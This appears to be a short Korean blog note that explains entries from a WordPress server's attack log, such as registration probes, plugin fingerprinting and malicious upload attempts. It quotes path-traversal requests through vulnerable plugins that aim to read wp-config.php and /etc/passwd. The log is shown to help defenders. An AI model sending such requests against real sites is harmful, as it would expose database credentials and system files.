# WebServer attack log
<br><br>

#### WebServer attack log # mysite
```text
GET path="/wp-login.php?action=register"
GET path="/index.php?option=com_user&task=register"
GET path="/user/register"
```

#### WebServer attack log Case Study
```text
GET /wp-content/plugins/advanced-dewplayer/admin-panel/download-file.php?dew_file=../../../../wp-config.php
```
> wp-config.php 파일을 다운로드 받으려는 시도로 보입니다. 
> wp-config.php 파일에는 DB 접속 정보가 기록
> wp-config.php 파일이 유출되고 외부에서 DB 접근이 가능한 상태

<br>

```text
GET /wp-content/plugins/candidate-application-form/downloadpdffile.php?fileName=../../../../../../../../../../etc/passwd
```
>/etc/passwd 파일을 다운로드 받으려는 시도
>/etc/passwd 파일은 리눅스의 사용자 계정 정보가 담긴 파일입니다.

<br>

```text
GET /wp-content/plugins/work-the-flow-file-upload/admin/assets/js/admin.js
```
> 보안 취약점이 발견된 플러그인이 설치되어 있는지 확인하기 위한 요청
  
<br>

```text
POST /wp-content/plugins/dzs-zoomsounds/admin/upload.php
```  
> 보안취약점을 이용하여 악성코드를 서버로 업로드하려는 요청

<br>

```text
POST /license.php
```
> 플러그인 보안 취약점을 이용하여 license.php 파일을 업로드하고 이를 실행하기 위한 요청.
> license.php 파일의 내용은 코드를 알아볼 수 없게끔 난독화 되어 있습니다.
> 이런 파일은 발견하는 즉시 삭제해야 합니다. 

<br><br>
> 출처 : 단비스토어
> 본문에 오탈자 및 오류가 있을 경우 피드백 주시면 감사하겠습니다.